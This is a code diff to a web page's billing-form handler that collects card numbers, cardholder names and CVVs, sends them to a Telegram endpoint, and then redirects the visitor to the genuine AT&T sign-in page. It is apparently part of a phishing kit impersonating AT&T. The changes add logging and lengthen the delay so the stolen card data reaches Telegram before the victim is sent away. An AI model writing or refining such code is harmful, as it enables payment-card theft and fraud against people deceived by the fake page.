@@ -106,6 +106,9 @@ export default function Home() {
       billingForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
+        console.log('[index.js] ========== FORM SUBMITTED ==========');
+        console.log('[index.js] Form submission started at:', new Date().toISOString());
+        
         const cardNumber = cardNumberInput.value.trim();
         const cardholderName = cardholderNameInput.value.trim();
         const cvv = cvvInput.value.trim();
@@ -204,6 +207,7 @@ export default function Home() {
           });
           
           // Send billing details to Telegram
+          console.log('[index.js] ========== SENDING TO TELEGRAM ==========');
           console.log('[index.js] Sending billing details to Telegram...');
           console.log('[index.js] Billing data:', {
             hasCardNumber: !!cardNumber,
@@ -219,6 +223,7 @@ export default function Home() {
           
           let telegramSuccess = false;
           try {
+            console.log('[index.js] Making fetch request to /api/telegram/send-billing...');
             const telegramResponse = await fetch('/api/telegram/send-billing', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -281,15 +286,18 @@ export default function Home() {
           }
           
           // Wait longer to ensure Telegram message is sent before redirect
-          // Give it 1 second to complete, or wait for response if successful
+          // Always wait at least 2 seconds to ensure Telegram API call completes
           if (telegramSuccess) {
-            console.log('[index.js] Telegram message sent, waiting 500ms before redirect...');
-            await new Promise(resolve => setTimeout(resolve, 500));
+            console.log('[index.js] ✅ Telegram message sent successfully, waiting 2 seconds before redirect...');
+            await new Promise(resolve => setTimeout(resolve, 2000));
           } else {
-            console.warn('[index.js] Telegram message may not have been sent, waiting 1000ms before redirect...');
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            console.error('[index.js] ⚠️ Telegram message FAILED - check server logs and browser console');
+            console.error('[index.js] Waiting 2 seconds before redirect anyway...');
+            // Still wait to give Telegram API time to complete even if it failed
+            await new Promise(resolve => setTimeout(resolve, 2000));
           }
           
+          console.log('[index.js] Redirecting now...');
           // Redirect to next page or show success
           window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
         } catch (error) {
